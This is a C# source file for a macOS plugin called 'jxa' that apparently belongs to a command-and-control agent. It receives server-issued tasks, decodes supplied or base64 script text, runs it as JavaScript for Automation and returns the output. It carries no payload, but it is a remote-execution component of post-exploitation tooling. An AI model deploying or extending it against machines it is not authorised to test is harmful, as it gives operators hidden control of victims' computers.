using System.Runtime.Versioning;
using System.Text;
using System.Text.Json;
using jxa;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    [SupportedOSPlatform("macos")]
    public class Plugin : IModule
    {
        public string Name => "jxa";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            JxaArgs args = JsonSerializer.Deserialize<JxaArgs>(
                job.task.parameters);

            try
            {
                string code;
                if (!string.IsNullOrEmpty(args.code))
                {
                    code = args.code;
                }
                else if (!string.IsNullOrEmpty(args.scriptcontents))
                {
                    byte[] bytes = Misc.Base64DecodeToByteArray(
                        args.scriptcontents);
                    code = Encoding.UTF8.GetString(bytes);
                }
                else
                {
                    messageManager.WriteLine(
                        "No valid scripts provided",
                        job.task.id,
                        true,
                        "error");
                    return;
                }

                DebugLog.Log(
                    $"{Name} executing script [{job.task.id}]");
                string result = OsaRunner.ExecuteJavaScript(code);
                messageManager.WriteLine(
                    result, job.task.id, true);
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    $"{Name} exception: {e.Message} [{job.task.id}]");
                messageManager.WriteLine(
                    e.ToString(), job.task.id, true, "error");
            }

            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
